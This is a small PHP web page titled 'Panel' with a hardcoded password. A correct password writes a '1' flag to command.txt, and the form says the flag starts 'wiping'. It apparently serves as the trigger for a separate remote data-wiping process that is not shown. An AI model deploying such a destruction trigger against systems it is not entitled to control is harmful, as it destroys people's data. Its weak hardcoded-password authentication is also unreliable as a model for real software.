<?php

$password = "kutay123";  // Change it

?>

<html>
<head>
<title>Panel</title>
</head>
<body>
<?php 
if (isset($_POST["password"]) && ($_POST["password"]=="$password")) {
?>

<?php
$file = fopen("command.txt","w");
echo fwrite($file,"1");
fclose($file);
?>
<b>Completed</b>

<?php 
}
else
{

if (isset($_POST['password']) || $password == "") {
  print "<p align=\"center\"><font color=\"red\"><b>Incorrect Password</b><br>Please enter the correct password</font></p>";}
  print "<form method=\"post\"><p align=\"center\">Please enter your password for start wiping<br>";
  print "<input name=\"password\" type=\"password\" size=\"25\" maxlength=\"10\"><input value=\"Login\" type=\"submit\"></p></form>";
}

?>

</body>
</html>
